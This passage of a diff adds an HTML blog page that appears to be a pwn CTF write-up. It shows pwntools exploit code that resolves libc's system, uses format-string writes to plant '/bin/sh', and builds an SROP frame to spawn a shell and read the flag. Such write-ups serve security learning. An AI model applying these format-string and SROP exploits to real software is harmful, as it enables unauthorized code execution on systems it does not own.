+        <span class="k">if</span> <span class="n">path</span> <span class="o">==</span> <span class="s">''</span><span class="p">:</span>
+                <span class="n">libc</span> <span class="o">=</span> <span class="n">LibcSearcher</span><span class="p">(</span><span class="n">pattern</span><span class="p">,</span> <span class="n">leak_addr</span><span class="p">)</span>
+                <span class="n">base</span> <span class="o">=</span> <span class="n">leak_addr</span> <span class="o">-</span> <span class="n">libc</span><span class="p">.</span><span class="n">dump</span><span class="p">(</span><span class="n">pattern</span><span class="p">)</span>
+                <span class="n">system</span> <span class="o">=</span> <span class="n">base</span> <span class="o">+</span> <span class="n">libc</span><span class="p">.</span><span class="n">dump</span><span class="p">(</span><span class="s">'system'</span><span class="p">)</span>
+                <span class="n">binsh</span> <span class="o">=</span> <span class="n">base</span> <span class="o">+</span> <span class="n">libc</span><span class="p">.</span><span class="n">dump</span><span class="p">(</span><span class="s">'str_bin_sh'</span><span class="p">)</span>
+        <span class="k">else</span><span class="p">:</span>
+                <span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">path</span><span class="p">)</span>
+                <span class="n">base</span> <span class="o">=</span> <span class="n">leak_addr</span> <span class="o">-</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="n">pattern</span><span class="p">]</span>
+                <span class="n">system</span> <span class="o">=</span> <span class="n">base</span> <span class="o">+</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="s">'system'</span><span class="p">]</span>
+                <span class="n">binsh</span> <span class="o">=</span> <span class="n">base</span> <span class="o">+</span> <span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">search</span><span class="p">(</span><span class="sa">b</span><span class="s">'/bin/sh'</span><span class="p">))</span>
+
+        <span class="k">return</span> <span class="n">system</span><span class="p">,</span> <span class="n">binsh</span>
+
+<span class="n">s</span>       <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+<span class="n">sa</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">delim</span><span class="p">,</span><span class="n">data</span>         <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">delim</span><span class="p">),</span> <span class="n">data</span><span class="p">)</span>
+<span class="n">sl</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+<span class="n">sla</span>     <span class="o">=</span> <span class="k">lambda</span> <span class="n">delim</span><span class="p">,</span><span class="n">data</span>         <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">delim</span><span class="p">),</span> <span class="n">data</span><span class="p">)</span>
+<span class="n">r</span>       <span class="o">=</span> <span class="k">lambda</span> <span class="n">num</span><span class="o">=</span><span class="mi">4096</span>           <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="n">num</span><span class="p">)</span>
+<span class="n">ru</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">delims</span>             <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="n">delims</span><span class="p">)</span>
+<span class="n">rl</span>      <span class="o">=</span> <span class="k">lambda</span>                    <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">recvline</span><span class="p">()</span>
+<span class="n">rls</span>     <span class="o">=</span> <span class="k">lambda</span> <span class="n">num</span><span class="o">=</span><span class="mi">1</span>              <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">recvlines</span><span class="p">(</span><span class="n">num</span><span class="p">)</span>
+<span class="n">itr</span>     <span class="o">=</span> <span class="k">lambda</span>                    <span class="p">:</span><span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+<span class="n">uu32</span>    <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">u32</span><span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="sa">b</span><span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">))</span>
+<span class="n">uu64</span>    <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">u64</span><span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">))</span>
+
+<span class="k">def</span> <span class="nf">dbg</span><span class="p">():</span>
+        <span class="n">gdb</span><span class="p">.</span><span class="n">attach</span><span class="p">(</span><span class="n">p</span><span class="p">)</span>
+        <span class="n">pause</span><span class="p">()</span>
+
+<span class="k">def</span> <span class="nf">write_to_writeable</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">addr</span><span class="p">):</span>
+        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">)):</span>
+                <span class="n">pay</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'%'</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="n">i</span><span class="p">])).</span><span class="n">encode</span><span class="p">(</span><span class="s">'utf-8'</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="s">'c%8$n'</span>
+                <span class="n">pay</span> <span class="o">=</span> <span class="n">pay</span><span class="p">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0x10</span><span class="p">,</span> <span class="sa">b</span><span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">addr</span><span class="o">+</span><span class="n">i</span><span class="p">)</span>
+                <span class="n">sl</span><span class="p">(</span><span class="n">pay</span><span class="p">)</span>
+                <span class="k">print</span><span class="p">(</span><span class="n">pay</span><span class="p">)</span>
+                <span class="k">print</span><span class="p">(</span><span class="n">ru</span><span class="p">(</span><span class="s">'You say:'</span><span class="p">))</span>
+
+<span class="k">def</span> <span class="nf">edit</span><span class="p">(</span><span class="n">index</span><span class="p">,</span> <span class="n">content</span><span class="p">):</span>
+        <span class="n">sla</span><span class="p">(</span><span class="s">':'</span><span class="p">,</span> <span class="s">'2'</span><span class="p">)</span>
+        <span class="n">sla</span><span class="p">(</span><span class="s">':'</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">))</span>
+        <span class="n">sla</span><span class="p">(</span><span class="s">':'</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">content</span><span class="p">)))</span>
+        <span class="n">sa</span><span class="p">(</span><span class="s">':'</span><span class="p">,</span> <span class="n">content</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">free</span><span class="p">(</span><span class="n">index</span><span class="p">):</span>
+        <span class="n">sla</span><span class="p">(</span><span class="s">':'</span><span class="p">,</span> <span class="s">'3'</span><span class="p">)</span>
+        <span class="n">sla</span><span class="p">(</span><span class="s">':'</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">))</span>
+
+<span class="k">def</span> <span class="nf">show</span><span class="p">(</span><span class="n">index</span><span class="p">):</span>
+        <span class="n">sla</span><span class="p">(</span><span class="s">':'</span><span class="p">,</span> <span class="s">'4'</span><span class="p">)</span>
+        <span class="n">sla</span><span class="p">(</span><span class="s">':'</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">))</span>
+
+<span class="n">ru</span><span class="p">(</span><span class="s">'Address of syscall, ret    : '</span><span class="p">)</span>
+<span class="n">syscall</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">ru</span><span class="p">(</span><span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="p">)[:</span><span class="o">-</span><span class="mi">1</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span>
+<span class="n">ru</span><span class="p">(</span><span class="s">'Address of writable memory : '</span><span class="p">)</span>
+<span class="n">bss</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">ru</span><span class="p">(</span><span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="p">)[:</span><span class="o">-</span><span class="mi">1</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span>
+<span class="n">ru</span><span class="p">(</span><span class="s">'Address of pop rax, ret    : '</span><span class="p">)</span>
+<span class="n">rax</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">ru</span><span class="p">(</span><span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="p">)[:</span><span class="o">-</span><span class="mi">1</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span>
+
+<span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="s">'syscall '</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">syscall</span><span class="p">))</span>
+<span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="s">'bss '</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">bss</span><span class="p">))</span>
+<span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="s">'rax ret'</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">rax</span><span class="p">))</span>
+
+<span class="c1"># write binsh to a writeable address
+</span><span class="n">write_to_writeable</span><span class="p">(</span><span class="s">'/bin/sh'</span><span class="p">,</span> <span class="n">bss</span><span class="p">)</span>
+
+<span class="n">pay</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'%8$s'</span> <span class="o">+</span> <span class="sa">b</span><span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="o">*</span><span class="mi">8</span> <span class="o">+</span> <span class="sa">b</span><span class="s">'----'</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">bss</span><span class="p">)</span>
+<span class="n">sl</span><span class="p">(</span><span class="n">pay</span><span class="p">)</span>
+<span class="k">print</span><span class="p">(</span><span class="n">pay</span><span class="p">)</span>
+<span class="k">print</span><span class="p">(</span><span class="n">rls</span><span class="p">(</span><span class="mi">3</span><span class="p">))</span>
+
+<span class="c1"># srop
+</span><span class="n">frame</span> <span class="o">=</span> <span class="n">SigreturnFrame</span><span class="p">()</span>
+<span class="n">frame</span><span class="p">.</span><span class="n">rip</span> <span class="o">=</span> <span class="n">syscall</span>
+<span class="n">frame</span><span class="p">.</span><span class="n">rax</span> <span class="o">=</span> <span class="mi">59</span>
+<span class="n">frame</span><span class="p">.</span><span class="n">rdi</span> <span class="o">=</span> <span class="n">bss</span>
+<span class="n">frame</span><span class="p">.</span><span class="n">rsi</span> <span class="o">=</span> <span class="mi">0</span>
+<span class="n">frame</span><span class="p">.</span><span class="n">rdx</span> <span class="o">=</span> <span class="mi">0</span>
+
+<span class="c1"># padding is 0x28
+</span><span class="n">pay</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'b'</span><span class="o">*</span><span class="mh">0x28</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">rax</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xf</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">syscall</span><span class="p">)</span> <span class="o">+</span> <span class="nb">bytes</span><span class="p">(</span><span class="n">frame</span><span class="p">)</span>
+<span class="n">sl</span><span class="p">(</span><span class="n">pay</span><span class="p">)</span>
+
+<span class="n">ru</span><span class="p">(</span><span class="s">'@'</span><span class="p">)</span>
+<span class="n">sl</span><span class="p">(</span><span class="s">'cat flag.txt'</span><span class="p">)</span>
+<span class="n">itr</span><span class="p">()</span>
+
+<span class="c1"># mark, learn brop, srop and fmt
+</span></code></pre></div></div>
+
+
+    </div>
+
+</article>
+<div class="post-nav">
+<a class="previous" href="/pwn/2022/03/28/chunk-overlapping-%E6%80%BB%E7%BB%93.html" title="Chunk overlapping 总结">Chunk overlapping 总结</a><span></span>
+</div>
+<div class="post-related">
+      <div>Related Articles</div>
+      <ul>
+        <li><a class="post-link" href="/markdown/2022/03/27/an-exhibit-of-markdown.html" title="">An exhibit of Markdown</a></li>
+<li><a class="post-link" href="/pwn/2022/03/27/2022DASCTF-X-SU-checkin.html" title="">2022DASCTF X SU checkin</a></li>
+<li><a class="post-link" href="/pwn/2022/03/27/Picoctf_2022-Write-Up.html" title="">Picoctf_2022 Write-Up</a></li>
+<li><a class="post-link" href="/pwn/2022/03/28/chunk-overlapping-%E6%80%BB%E7%BB%93.html" title="">Chunk overlapping 总结</a></li>
+</ul>
+    </div>
+<div class="post-comments"></div></section>
+</div>
+
+
+  </section>
+  <section class="sidebar" style="margin-left: 15px;">
+    <!-- Get sidebar items --></section>
+</div>
+
+      </div>
+    </main><footer class="site-footer h-card">
+  <data class="u-url" href="/"></data>
+
+  <div class="wrapper">
+    <div class="site-footer-inner">
+      <div>Copyright © 2021-2022 @huyinhao</div>
+      <div>Powered by <a title="Jekyll is a simple, blog-aware, static site
+      generator." href="http://jekyllrb.com/">Jekyll</a> &amp; <a title="Yat, yet
+      another theme." href="https://github.com/jeffreytse/jekyll-theme-yat">Yat Theme</a>.</div>
+      <div class="footer-col rss-subscribe">Subscribe <a href="/feed.xml">via RSS</a>
+</div>
+    </div>
+  </div>
+</footer>
+</body>
+</html>
